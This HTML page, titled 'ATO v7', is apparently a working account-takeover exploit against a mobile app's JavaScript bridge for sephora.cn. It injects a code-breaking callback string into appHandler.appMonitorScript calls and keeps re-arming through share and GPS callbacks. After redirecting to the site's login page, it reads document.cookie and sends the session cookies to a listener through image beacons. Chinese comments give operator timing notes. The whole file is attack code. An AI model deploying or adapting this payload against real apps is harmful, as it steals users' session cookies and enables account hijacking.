<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>ATO-v7</title></head>
<body style="background:#111;color:#0f0;font-family:monospace;padding:16px;font-size:13px">
<h3 style="color:#c9a96e">ATO v7</h3>
<div id="log"></div>
<script>
window.sep={_onSuccess:function(){},_onFailure:function(){},_onCancel:function(){}};
function L(s){document.getElementById('log').innerHTML+=s+'<br>'}
function B(t,d){new Image().src='http://127.0.0.1:8899/x?t='+t+'&d='+encodeURIComponent(d||'').substring(0,650)}

window.__p="0);(function(){var c=document.cookie,o=location.origin;if(o.indexOf('sephora.cn')>=0){new Image().src='http://127.0.0.1:8899/x?t=WIN&d='+encodeURIComponent(o+'|||'+c.substring(0,600));try{var d=document.createElement('div');d.style.cssText='position:fixed;top:0;left:0;right:0;z-index:2147483647;background:#c00;color:#fff;padding:14px;font:700 13px monospace;word-break:break-all';d.textContent='ATO-WIN('+c.length+'): '+c.substring(0,160);document.body.appendChild(d)}catch(e){}return}if(!window.__n)window.__n=0;window.__n++;new Image().src='http://127.0.0.1:8899/x?t=cb'+window.__n+'&d='+encodeURIComponent(o);if(window.__n<30){try{appHandler.appMonitorScript('getGPS',window.__p,'{}')}catch(e){}}})();//";

B('load',location.href);L('page loaded');
if(typeof appHandler==='undefined'){L('NO bridge');B('nobridge','')}
else{
  L('bridge OK');
  // 载体: 分享面板(取消时fire) + GPS循环(每~500ms)
  appHandler.appMonitorScript('shareApp',window.__p,'{"title":"t","content":"c","shareUrl":"https://m.sephora.cn/"}');
  appHandler.appMonitorScript('getGPS',window.__p,'{}');
  L('armed: shareApp + GPS');
  L('6秒后原地跳转sephora页; 跳转后请点掉分享面板');

  // setInterval 可靠(v5证明setTimeout会丢): tick3=6s时导航
  var tick=0;
  var t=setInterval(function(){
    tick++;
    B('hb',''+tick);
    if(tick===3){
      clearInterval(t);
      B('nav','');
      L('nav now');
      // 导航前最后补一发arm(增加落在新页面的概率)
      try{appHandler.appMonitorScript('getGPS',window.__p,'{}')}catch(e){}
      location.href='https://m.sephora.cn/app/login?historyLocation='+encodeURIComponent('https://m.sephora.cn/');
    }
  },2000);
}
</script></body></html>
